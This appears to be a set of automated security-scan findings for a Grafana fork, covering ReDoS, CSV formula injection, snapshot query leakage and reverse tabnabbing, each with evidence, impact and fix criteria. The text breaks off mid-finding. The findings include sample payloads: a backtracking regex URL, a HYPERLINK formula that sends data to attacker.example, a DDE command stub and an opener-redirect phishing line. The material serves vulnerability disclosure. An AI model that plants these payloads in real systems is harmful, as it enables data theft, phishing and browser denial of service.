Attacker: anyone who can get text into a log stream (adversary 4, a compromised datasource, or an unprivileged client whose request data the monitored application logs). Victim: every Grafana user who views that stream in a Logs panel. This is deterministic, not volumetric: one crafted line suffices.

This is distinct from logs-searchwords-regex-redos (grammar.ts:55): the regexes here are Grafana's own and the attacker controls only the subject string. Dependency facts: prismjs as bundled (webpack://grafana/./node_modules/prismjs/prism.js, recovered from public/build/7606.*.js.map; version banner absent) implements matchPattern as `pattern.lastIndex = pos; pattern.exec(text)` with no linear-time fallback (confirmed). Assumption: the victim's browser RegExp engine (V8 Irregexp, SpiderMonkey, JavaScriptCore) is a backtracking engine without a linear-time fallback enabled by default, which is their standard behaviour but is not verifiable from this checkout.

## Evidence
1. [public/app/features/logs/components/panel/grammar.ts:8–18](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/grammar.ts#L8-L18)
   'log-token-key' /(\b|\B)[\w_]+(?=\s*=)/gi (logsGrammar, line 9) and 'log-token-size' /(?:\b|")\d+\.{0,1}\d*\s*[kKmMGgtTPp]*[bB]{1}(?:"|\b)/g (tokensGrammar, line 15) each contain an unbounded greedy run whose continuation can only fail after the run. On a word/digit run of length n with no `=` (resp. `b` unit) after it, exec() backtracks O(n) at each of the n start positions (log-token-key: (\b|\B) accepts every position) or across the O(n^2) splits of \d+ / \d* at the run's start (log-token-size), i.e. O(n^2) per line. generateLogGrammar (line 48-52) applies both to every non-JSON log line.
2. [public/app/features/logs/components/panel/processing.ts:198–207](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/processing.ts#L198-L207)
   highlightedBodyTokens runs Prism.tokenize(body, grammar) synchronously during render; the body getter (lines 146-174) returns the full raw line unless this.collapsed is true (lines 166-168), and the token cache is cleared on every search/collapse change (lines 273-290).
3. [public/app/features/logs/components/panel/virtualization.ts:288–298](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/virtualization.ts#L288-L298)
   getLogLineSize returns at line 288-290 ('Unwrapped logs always measure 1 line') before calling updateCollapsedState() (line 296), so with wrapping off collapsed stays undefined and the body is never truncated to getTruncationLength(); that length-based collapse is the only cap on the text passed to Prism.
4. [public/app/plugins/panel/logs/module.tsx:61–70](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/plugins/panel/logs/module.tsx#L61-L70)
   The Logs panel's 'Wrap lines' option (path wrapLogMessage) has defaultValue: false, so a dashboard Logs panel renders unwrapped by default and LogsPanel.tsx passes that value straight to LogList (line 553); syntaxHighlighting is passed undefined (line 548) and LogList.tsx line 176 defaults it to true.
5. [public/app/features/logs/components/panel/LogLine.tsx:490–498](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogLine.tsx#L490-L498)
   LogLineBody renders HighlightedLogRenderer with log.highlightedBodyTokens for every visible row whenever syntaxHighlighting is true (the default); there is no length-based fallback to plain text.

## Impact
The victim's browser tab blocks for tens of seconds to minutes per render of the offending line; the dashboard session is unusable while the stream is in view and re-triggers on every re-render. No confidentiality or integrity impact; availability loss is confined to the victim's tab.

## Reproduction steps
1. An attacker who writes (or causes a monitored application to write) a log line containing ~100K consecutive word characters or digits, or a compromised datasource returning such a frame, triggers the quadratic patterns whenever any Grafana user renders the stream with syntax highlighting on (default) in an unwrapped Logs panel (the panel default, module.tsx:69). No Grafana privileges are needed to produce the log content; the victim merely opens the dashboard (UI:P). Requires the stream to be displayed and wrapping to be off (Explore defaults wrapping on), so AT:PRESENT.

## Recommended fix
The 'log-token-key' and 'log-token-size' grammar patterns use an unbounded greedy character class whose continuation can fail after the run, giving O(n^2) backtracking on long tokens supplied by untrusted log content. Fix criteria: Highlighting must run in time linear in the line length regardless of content: rewrite the patterns so the greedy run cannot be re-split on failure (e.g. anchor with a required boundary before the run, bound token length, or remove the ambiguous \d+\.{0,1}\d* / (\b|\B) prefixes), and/or cap the length of text passed to Prism.tokenize independent of wrap/collapse state. Verify by rendering an unwrapped line of 200,000 digits with syntax highlighting enabled and confirming render completes in well under a second.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256222

---

# Panel search regex compiled from URL-synced variable value enables ReDoS in dashboard view

## Details
DashboardScene exposes an undocumented 'panel filter' feature: if a dashboard defines a variable named `systemPanelFilterVar`, its current value is copied into `state.panelSearch` — on activation by `_initializePanelSearch()` (DashboardScene.tsx:243, 289-300) and on every later change by `DashboardVariableDependency.variableUpdateCompleted()` (DashboardScene.tsx:1555-1559). When panelSearch is non-empty, `DashboardSceneRenderer.renderBody()` (lines 90-93) swaps the body for `PanelSearchLayout`, which builds a `SoloPanelContextValueWithSearchStringFilter`; every `DashboardGridItemRenderer` (and the auto-grid equivalent) then calls `renderMatchingSoloPanels` → `matches(panel)` for each panel and its repeats. `matches()` (PanelSearchLayout.tsx:61-82) does `new RegExp(interpolatedSearchString, 'i')` and `regex.test(interpolatedTitle)` synchronously inside React render; the try/catch only swallows SyntaxError, and the search string is neither escaped nor length-limited.

The search string is URL-controlled. Dashboard pages render inside `UrlSyncContextProvider` (DashboardScenePage.tsx:159), and the scenes `TextBoxVariable.updateFromUrl()` (recovered from `public/build/7606.e8e4d98948a4bb1cf3bc.js.map`, `@grafana/scenes/dist/esm/variables/variants/TextBoxVariable.js`) sets any string found under `var-<name>` verbatim. An unauthenticated attacker therefore only has to send a user who can view such a dashboard a link like `/d/<uid>/<slug>?var-systemPanelFilterVar=%28.%2A%29%2A%28.%2A%29%2A%00` (`(.*)*(.*)*` followed by a character the titles cannot contain). Nested quantifiers over `.` back-track exponentially in the subject length (2^(n-1) partitions of a title of n characters before the trailing literal fails), so panel titles of ~25-40 characters pin the main thread for seconds to minutes, once per panel, and the tab is unresponsive from first render. If titles interpolate other textbox variables (`$instance`), the same URL also lengthens the subject.

This is reachable from the URL and inside the recorded threat model's ReDoS carve-out. Preconditions: the target dashboard must define a textbox variable (the type whose URL sync accepts arbitrary strings) with the exact name `systemPanelFilterVar` — the feature exists only in DashboardScene.tsx and is not documented, so only dashboards built to use it are affected (AT:PRESENT). The same sink is reachable by an Editor who adds such a variable with the pattern as its stored default, hanging every viewer who opens the dashboard; the URL path is the one that crosses the unauthenticated→user boundary. The companion `systemDynamicRowSizeVar` only feeds `Number.parseInt` and is not affected.

## Evidence
1. [public/app/features/dashboard-scene/scene/PanelSearchLayout.tsx:61–82](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/PanelSearchLayout.tsx#L61-L82)
   SoloPanelContextValueWithSearchStringFilter.matches() compiles the search string with `new RegExp(interpolatedSearchString, 'i')` and runs `regex.test(interpolatedTitle)` for every panel; the pattern is unescaped and unbounded, and the catch handles only SyntaxError, not catastrophic backtracking.
2. [public/app/features/dashboard-scene/scene/DashboardScene.tsx:289–299](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/DashboardScene.tsx#L289-L299)
   _initializePanelSearch() (called from the activation handler at line 243) copies the value of the dashboard variable named `systemPanelFilterVar` straight into state.panelSearch; the variable's value is URL-synced (`var-systemPanelFilterVar=`) through scenes TextBoxVariable.updateFromUrl.
3. [public/app/features/dashboard-scene/scene/DashboardScene.tsx:1555–1558](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/DashboardScene.tsx#L1555-L1558)
   DashboardVariableDependency.variableUpdateCompleted() re-applies any later value of `systemPanelFilterVar` to panelSearch, so the regex is rebuilt on every variable change too.
4. [public/app/features/dashboard-scene/scene/DashboardSceneRenderer.tsx:90–92](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/DashboardSceneRenderer.tsx#L90-L92)
   When panelSearch is non-empty the renderer swaps the body for PanelSearchLayout, whose SoloPanelContextValueWithSearchStringFilter is provided to every layout item.
5. [public/app/features/dashboard-scene/scene/layout-default/DashboardGridItemRenderer.tsx:56–61](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/scene/layout-default/DashboardGridItemRenderer.tsx#L56-L61)
   Each grid item calls renderMatchingSoloPanels(soloPanelContext, [body, ...repeatedPanels]) during render, which invokes matches() — and therefore the attacker's regex — synchronously for every panel and repeat.
6. [public/app/features/dashboard-scene/pages/DashboardScenePage.tsx:159](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePage.tsx#L159)
   The dashboard page renders inside UrlSyncContextProvider, so `var-<name>` query-string parameters are applied to the dashboard's variables on load (scenes TextBoxVariable.updateFromUrl sets any string verbatim).

## Impact
Denial of service of the victim's browser session: the Grafana tab stops responding until the user kills it. No data is read or modified. Impact is confined to the clients that open the link (or, via the Editor-stored variant, every viewer of that dashboard), one client at a time, so availability is rated LOW rather than HIGH.

## Reproduction steps
1. An unauthenticated attacker crafts a dashboard URL whose query string sets `var-systemPanelFilterVar` to a catastrophically back-tracking pattern and delivers it to a user who can view that dashboard (phishing link, chat, link in another dashboard). On load, scenes URL sync sets the textbox variable, DashboardScene copies it to panelSearch, and PanelSearchLayout compiles and tests the regex against each panel title during render, freezing the tab. No escaping, length limit or time bound stands in the way. The one requirement is that the dashboard defines a textbox variable with that exact name, which only dashboards built for the undocumented panel-filter feature do (AT:P). Assumes the browser's regex engine is backtracking without a step limit (V8 irregexp / SpiderMonkey, their default configuration).

## Recommended fix
PanelSearchLayout compiles an untrusted, unbounded string as a regular expression and evaluates it synchronously against every panel title, allowing catastrophic backtracking from a URL-controlled variable value. Fix criteria: A value supplied through `var-systemPanelFilterVar` (or the variable's stored value) must not be able to make the dashboard render take super-linear time: treat the search string as literal text (escape regex metacharacters or use substring/fuzzy matching only), or validate/limit the pattern (length cap, reject nested quantifiers) and run matching with a bounded-time mechanism. Verify by loading a dashboard that defines the variable with `?var-systemPanelFilterVar=(.*)*(.*)*x` against panels with 40-character titles and confirming the page renders promptly.

---
**Severity:** LOW
**Status:** Open
**Category:** ReDoS
**CWE:** [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256221

---

# CSV export (logs download and panel inspector) writes datasource-controlled cells without neutralising spreadsheet formula prefixes

## Details
Grafana's frontend CSV export writes datasource-controlled strings as spreadsheet cells without neutralising formula-leading characters. Both export entry points share one sink: the logs 'Download logs -> csv' action (LogListControls / LogTableControls -> LogListContext.downloadLogs -> features/logs/utils.ts downloadLogs -> downloadDataFrameAsCsv) and the panel inspector / Explore inspector 'Download CSV' button (InspectDataTab.exportCsv -> downloadDataFrameAsCsv). downloadDataFrameAsCsv (features/inspector/utils/download.ts) calls @grafana/data toCSV, whose writeValue (recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map, packages/grafana-data/src/utils/csv.ts:196-209) only escapes embedded double quotes and quotes cells containing a newline or the delimiter. A cell beginning with `=`, `+`, `-`, `@`, tab or carriage return is emitted verbatim, and neither caller adds a prefix or wrapper.

Every cell is datasource-returned data: log line text, label values, extra fields, or panel query results. An attacker who can get a string such as `=HYPERLINK("https://attacker.example/?"&A2;"details")`, `=WEBSERVICE(...)` or a DDE payload (`=cmd|' /C ...'!A0`) into the monitored application's logs or into a datasource response (threat-model adversary 4; no Grafana privileges needed when the application logs attacker input such as a User-Agent or request path) causes that text to be written as a live formula cell. When a Grafana user downloads the CSV and opens it in Excel or LibreOffice — the project explicitly supports this via the documented 'Download for Excel' toggle — the formula is evaluated: neighbouring cells (other log lines, labels, query results in the export) can be exfiltrated via HYPERLINK (on click) or WEBSERVICE, and, if the user accepts the spreadsheet's security prompts, DDE/command execution is possible on the user's workstation.

Reachability: in Explore the logs download is enabled by default (conf/defaults.ini hide_logs_download = false); in dashboards it requires the Logs/Logs table panel option allowDownload; the panel inspector 'Download CSV' is available to any user who can view the panel. TXT and JSON exports are not affected (plain text / JSON.stringify).

Dependency assumption: @grafana/data toCSV behaves as recovered from the shipped bundle's source map for this build (workspace package in the Grafana 13.2.4 monorepo); there is no formula-prefix handling in it or in a CSVConfig option that either caller could enable.

## Evidence
1. [public/app/features/inspector/utils/download.ts:56–93](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/inspector/utils/download.ts#L56-L93)
   downloadDataFrameAsCsv() is the single CSV sink for both callers. It passes the frame to @grafana/data toCSV() and saves the result as text/csv (or utf-16le tab-delimited in excelCompatibilityMode). The toCSV source recovered from public/build/6540.a30454ce5fbe65a84f5f.js.map (webpack://grafana/./packages/grafana-data/src/utils/csv.ts, writeValue lines 196-209) quotes a cell only when it contains a double quote, a newline or the delimiter; a cell beginning with =, +, -, @, \t or \r is emitted verbatim. No neutralisation is added here. This is the code the fix must change.
2. [public/app/features/logs/utils.ts:539–579](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/utils.ts#L539-L579)
   downloadLogs(DownloadFormat.CSV) takes each row's original datasource DataFrame (row.dataFrame), extracts labels into columns via getLogsExtractFields (explore/Logs/LogsTable.tsx:374), prepends an ISO Date column, and calls downloadDataFrameAsCsv at line 577 with no csvConfig and no per-cell check. Log line body, label values and extra fields become cells unchanged.
3. [public/app/features/inspector/InspectDataTab.tsx:102–108](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/inspector/InspectDataTab.tsx#L102-L108)
   exportCsv() hands the selected (optionally transformed) frame from props.data to downloadDataFrameAsCsv. props.data is the panel's query result (dashboard-scene/inspect/InspectDataTab.tsx:67 data={data?.series}) or the Explore query response (explore/ExploreQueryInspector.tsx:72-73 data={dataFrames}), so every datasource field value, label and string cell reaches the same sink via the 'Download CSV' button; the 'Download for Excel' toggle documents the intended consumer.
4. [public/app/features/logs/components/panel/LogListControls.tsx:232–240](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogListControls.tsx#L232-L240)
   The 'csv' entry of the logs download menu is the user-facing trigger; the menu is shown in Explore whenever config.exploreHideLogsDownload is false (line 449; conf/defaults.ini:1986 hide_logs_download = false) and in dashboards when the panel's allowDownload option is set (LogTableControls.tsx:90 has the same gate for the table variant).
5. [public/app/features/logs/components/panel/LogListContext.tsx:538–547](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/logs/components/panel/LogListContext.tsx#L538-L547)
   downloadLogs in the context forwards the currently displayed rows (datasource content, optionally filtered by level) and displayedFields to utils.downloadLogs.

## Impact
No Grafana state, session or data is read, altered or made unavailable; the exported file faithfully contains the datasource's bytes. The harm materialises only when a separate application interprets those bytes as a formula, so impact on the vulnerable system is none. Subsequent-system impact: The spreadsheet application on the user's workstation evaluates the attacker-authored formula: HYPERLINK/WEBSERVICE can exfiltrate other cells of the export (other log lines, labels, query values) to an attacker host (confidentiality LOW), and DDE-style payloads can run commands when the user accepts the spreadsheet's warnings, which modern defaults make non-trivial (integrity LOW). No availability impact.

## Reproduction steps
1. The attacker places a formula-shaped string into a log line, label or datasource field (no Grafana privileges required when the monitored application logs attacker input; otherwise a compromised or malicious datasource). A Grafana user then downloads the CSV via the logs download menu (default-on in Explore) or the inspector 'Download CSV' button and opens the file in a spreadsheet, accepting any security prompt (UI:ACTIVE). Exploitation depends on the victim using a spreadsheet application and on the export being downloaded, so AT:PRESENT; the sink itself is reached over the network through normal datasource query flow (AV:N, AC:L).

## Recommended fix
downloadDataFrameAsCsv (and the @grafana/data toCSV writer it relies on) emits datasource-controlled cell values without neutralising characters that spreadsheet applications interpret as formula prefixes (=, +, -, @, tab, CR), and neither the logs download nor the inspector export adds such neutralisation. Fix criteria: Every cell written by downloadDataFrameAsCsv — for both the logs CSV download and the inspector 'Download CSV', in both normal and Excel-compatibility modes — must be inert when opened in a spreadsheet: a string cell whose first character is =, +, -, @, \t or \r is prefixed (e.g. with a single quote or tab) or otherwise rendered as literal text, ideally by a shared option in toCSV so every caller inherits it. Verify by exporting a log line and a panel string field that begin with '=HYPERLINK(' and confirming Excel and LibreOffice display them as literal text.

---
**Severity:** LOW
**Status:** Open
**Category:** CSV injection
**CWE:** [CWE-1236](https://cwe.mitre.org/data/definitions/1236.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** LOW
**Subsequent system integrity impact:** LOW
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256220

---

# Snapshot serialization keeps raw queries and datasource refs for panels inside collapsed rows

## Details
When a user publishes a dashboard snapshot (Share -> Snapshot, ShareSnapshot.tsx -> ShareSnapshotTab.onSnapshotCreate), prepareSnapshot() serializes a v1 dashboard with transformSceneToSaveModel(scene, true) and then trimDashboardForSnapshot(). The UI (ShareSnapshotTab.tsx:246) and the docs (share-dashboards-panels/_index.md:120) promise that queries and panel links are stripped and only visible data remains.

For dashboards whose rows are SceneGridRow objects (the classic DefaultGridLayoutManager layout), gridRowToSaveModel() in snapshot mode serializes the row's children with gridItemToPanel(c, !collapsed) / panelRepeaterToPanels(c, !collapsed) (comment: 'Perform snapshot only for uncollapsed panels'). For a collapsed row this passes isSnapshot=false, so vizPanelDataToPanel() emits queryRunner.state.queries (the full query text: SQL, PromQL, LogQL, Elasticsearch DSL, Infinity/JSON API URLs, etc.) and queryRunner.state.datasource (real type + uid), exactly as in a normal save; panelRepeaterToPanels with isSnapshot=false likewise returns gridItemToPanel(repeater) unscrubbed. These panels are stored under rowPanel.panels. trimDashboardForSnapshot() then clears links only for top-level result.panels and never recurses into rowPanel.panels, so those inner panels also keep their panel links.

The payload is POSTed verbatim to /api/snapshots (the backend is assumed to store the dashboard JSON opaquely, consistent with CreateDashboardSnapshotCommand.dashboard in the API spec). Snapshots are readable by anyone with the key (routes.tsx:109 allowAnonymous for type==='snapshot'; /api/snapshots/<key> returns the JSON), and with external=true the server forwards it to external_snapshot_url (https://snapshots.raintank.io, external_enabled=true by default). Because the stored panels carry real targets and datasource refs, a snapshot viewer who expands the row also causes SceneQueryRunner (createPanelDataProvider) to issue live /api/ds/query requests to the original datasource under their own session.

Reachability condition: SceneGridRow rows are built only when getSceneCreationOptions() returns undefined, i.e. when the GA feature toggle dashboardNewLayouts is disabled (DashboardScenePageStateManager.ts:165-187; the docs state GA toggles are enabled by default and may be disabled by the operator). With the toggle on, v1 rows become RowItem and both rowItemToSaveModel and the v2 serializer (getVizPanelQueries) scrub every panel regardless of collapse, which also confirms that scrubbing collapsed-row panels is the intended behaviour. The legacy ShareSnapshot.scrubDashboard likewise intends to remove all panel queries.

Impact: query text and datasource identifiers (and panel links) of every panel inside a collapsed row are disclosed to all snapshot recipients and, for external snapshots, to a third-party server, contrary to what the author was told. Query text commonly embeds internal hostnames, table/index names, label values, tenant IDs or tokens in URL-style queries.

## Evidence
1. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:462–475](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L462-L475)
   In snapshot mode gridRowToSaveModel serializes a row's children with gridItemToPanel(c, !collapsed) / panelRepeaterToPanels(c, !collapsed). For a collapsed row (collapsed = Boolean(gridRow.state.isCollapsed), line 418) every child is serialized with isSnapshot=false, i.e. as a normal save-model panel, and stored under rowPanel.panels.
2. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:298–359](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L298-L359)
   vizPanelDataToPanel replaces targets/datasource with the grafana snapshot datasource only when isSnapshot is true; with false it emits queryRunner.state.queries (raw query text) and queryRunner.state.datasource (real type/uid). panelRepeaterToPanels (364-366) with isSnapshot=false returns gridItemToPanel(repeater) unscrubbed.
3. [public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts:1002–1031](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/serialization/transformSceneToSaveModel.ts#L1002-L1031)
   trimDashboardForSnapshot clears links only for top-level result.panels; it does not recurse into rowPanel.panels, so inner panels of collapsed rows keep their panel links as well as their targets.
4. [public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx:145–204](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/sharing/ShareSnapshotTab.tsx#L145-L204)
   prepareSnapshot() calls transformSceneToSaveModel(scene, true) then trimDashboardForSnapshot for v1 dashboards, and onSnapshotCreate POSTs the result to /api/snapshots with external=true when the user picks the external server. Line 246 tells the user queries and panel links are stripped.
5. [public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts:165–187](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/dashboard-scene/pages/DashboardScenePageStateManager.ts#L165-L187)
   getSceneCreationOptions returns the v2 RowItem layout creator only when dashboardNewLayouts is enabled; otherwise transformSaveModelToScene builds the classic layout with SceneGridRow rows, which is the only layout that reaches gridRowToSaveModel. This fixes the reachability condition: the leak occurs when the GA toggle dashboardNewLayouts is disabled.
6. [conf/defaults.ini:582–589](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/conf/defaults.ini#L582-L589)
   external_enabled defaults to true with external_snapshot_url = https://snapshots.raintank.io, so the unscrubbed payload can be forwarded to a third-party server.
7. [docs/sources/visualizations/dashboards/share-dashboards-panels/\_index.md:120](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/docs/sources/visualizations/dashboards/share-dashboards-panels/_index.md#L120)
   The project documents that a snapshot 'publicly shares a dashboard while removing sensitive data such as queries and panel links' and that 'anyone with the link can access the snapshot' - the concession the leaking path exceeds.

## Impact
Query definitions, datasource identifiers and panel links the product promises to remove are disclosed to unauthenticated snapshot viewers and a third-party server. These reveal internal names and query structure but not credentials; no integrity or availability impact.

## Reproduction steps
1. Reachable only on instances running the classic layout (dashboardNewLayouts disabled, a documented GA toggle). An editor whose dashboard contains a collapsed row publishes a snapshot (optionally to snapshots.raintank.io), trusting the UI statement that queries are stripped, and shares the link. Any holder of the key - unauthenticated, per routes.tsx:109 - fetches /api/snapshots/<key> and reads the raw queries, datasource uids and panel links of the collapsed-row panels; the external snapshot host receives the same payload. The attacker is passive; the victim's deliberate snapshot action is required.

## Recommended fix
1. gridRowToSaveModel inverts the isSnapshot flag for collapsed rows, so their panels are serialized as live panels with real targets and datasource refs. Fix criteria: In snapshot mode every panel inside a SceneGridRow, collapsed or not, must be serialized with the snapshot datasource and a snapshot query (or an empty snapshot) instead of its original targets and datasource. Verify by snapshotting a classic-layout dashboard with a collapsed row whose panel has a distinctive query string and asserting the string and the datasource uid are absent from the POSTed body.
2. trimDashboardForSnapshot only strips links from top-level panels and does not recurse into rowPanel.panels. Fix criteria: Panel links must be removed from panels nested under collapsed row panels as well as top-level panels; a test with a collapsed row containing a panel with links must produce a snapshot with no links anywhere in the payload.

---
**Severity:** LOW
**Status:** Open
**Category:** Information exposure
**CWE:** [CWE-212](https://cwe.mitre.org/data/definitions/212.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/grafanna
**Branch:** main
**Commit:** b5926dce1d4e96c91966744d89cd016af3f44b27
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_019iXQSLyZoKTnm63UmVYEHf&finding=scan_012mSAEzQmHjt1JiL4MG5bXM-5256216

---

# Explore toolbar extension link opened via window.open without noopener enables reverse tabnabbing

## Details
Explore's toolbar extension point renders links registered by app plugins at PluginExtensionPoints.ExploreToolbarAction. When a user selects a path-bearing link, ConfirmNavigationModal offers "Open in new tab", which executes `global.open(locationUtil.assureBaseUrl(path), '_blank')` (compiled as `f.g.open(...)`, webpack's global = window).

Two properties combine:
1. `path` is plugin-supplied and unvalidated. AddedLinksRegistry only checks that a title exists, configure is a function and `path || onClick` is set; `addedLinkToExtensionLink` forwards it (or a configure() override) verbatim plus tracking params. `locationUtil.assureBaseUrl` (grafana-data utils/location.ts, recovered from the shipped source map) is `url.startsWith('/') ? appSubUrl + stripBaseFromUrl(url) : url`, so an absolute `https://third-party/...` passes through unchanged and `//host/...` survives stripBaseFromUrl unmodified. No `/a/<pluginId>/` prefix assertion exists in this tree.
2. `window.open(url, '_blank')` is called without the `noopener` feature. Browsers imply noopener only for `<a target=_blank>` anchors, not for window.open, and conf/defaults.ini configures no Cross-Origin-Opener-Policy, so the newly opened cross-origin document receives a live `window.opener` referencing the authenticated Grafana tab.

Consequence: when an installed app plugin's Explore toolbar link points off-origin (vendor documentation, a SaaS console, a URL the plugin's configure() builds from the Explore context), the destination page — or any page it redirects to, or whoever compromises that host — can run `opener.location = 'https://look-alike/login'` and replace the victim's authenticated Grafana tab with a phishing page while the user looks at the new tab (CWE-1022 reverse tabnabbing). The victim need only click a link and "Open in new tab" in a modal Grafana itself presents as a trusted navigation prompt; any user with datasources:explore (Viewers by default) is a victim.

This is a host-code defect: Grafana severs the opener everywhere else (rel="noopener noreferrer" on its external anchors; `window.open(href, '_blank', 'noopener,noreferrer')` in SpanDetailLinkButtons.tsx:317 for datasource-derived links), but this raw window.open does not. A malicious plugin gains nothing (its JS already runs in the page); the attacker is the external destination of a benign plugin's link. The finding holds only where at least one installed plugin registers an off-origin ExploreToolbarAction link — the checkout cannot settle whether a given deployment has one (Grafana's own queryless drilldown apps use same-origin /a/ paths). The identical pattern exists in alerting's ConfirmationNavigationModal.tsx:17 (AlertingRuleQueryExtensionPoint), DrilldownExtensionPoint.tsx:50 and TracePageHeader.tsx:241.

## Evidence
1. [public/app/features/explore/extensions/ConfirmNavigationModal.tsx:16–19](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/extensions/ConfirmNavigationModal.tsx#L16-L19)
   openInNewTab() calls global.open(locationUtil.assureBaseUrl(path), '_blank') with no 'noopener' window feature and no scheme/origin check on `path`. The compiled chunk (public/build/explore.*.js) emits `f.g.open(...)`, webpack's global = window, so this is a live window.open. Browsers imply noopener only for <a target=_blank>, not window.open, so the opened document receives a live window.opener referencing the authenticated Grafana tab; conf/defaults.ini sets no Cross-Origin-Opener-Policy that would sever it.
2. [public/app/features/explore/extensions/ToolbarExtensionPoint.tsx:80–86](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/explore/extensions/ToolbarExtensionPoint.tsx#L80-L86)
   Renders ConfirmNavigationModal with selectedExtension.path for every link returned by usePluginLinks(ExploreToolbarAction) — any installed app plugin's link with a path (ToolbarExtensionPointMenu routes every path-bearing item to onSelect). Explore is reachable by any user with datasources:explore (routes.tsx:228), i.e. Viewers by default.
3. [public/app/features/plugins/extensions/registry/AddedLinksRegistry.ts:45–69](https://github.com/Halbarevi/grafanna/blob/b5926dce1d4e96c91966744d89cd016af3f44b27/public/app/features/plugins/extensions/registry/AddedLinksRegistry.ts#L45-L69)
